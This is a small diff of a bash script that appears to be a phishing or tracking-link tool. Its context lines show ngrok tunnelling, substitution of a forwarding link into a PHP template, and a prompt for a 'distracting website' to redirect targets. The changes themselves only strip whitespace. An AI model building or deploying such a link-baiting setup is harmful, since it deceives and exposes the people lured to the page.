@@ -222,8 +222,6 @@ payload_ngrok
 checkfound
 }
 
-
-
 ngrok_server1() {
 
 
@@ -313,7 +311,6 @@ sed 's+forwarding_link+'$send_link'+g' template.php > index.php
 
 
 }
-
 start3() {
 if [[ -e sendlink ]]; then
 rm -rf sendlink
@@ -331,7 +328,6 @@ printf "\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Choose a distracting website (Defa
 read redirect_link
 redirect_link="${redirect_link:-${default_redirect}}"
 
-
 if [[ $option_server -eq 1 ]]; then
 
 command -v php > /dev/null 2>&1 || { echo >&2 "I require ssh but it's not installed. Install it. Aborting."; exit 1; }
@@ -339,7 +335,7 @@ start4
 
 elif [[ $option_server -eq 2 ]]; then
 ngrok_server1
-		
+
 else
 printf "\e[1;93m [!] Invalid option!\e[0m\n"
 sleep 1
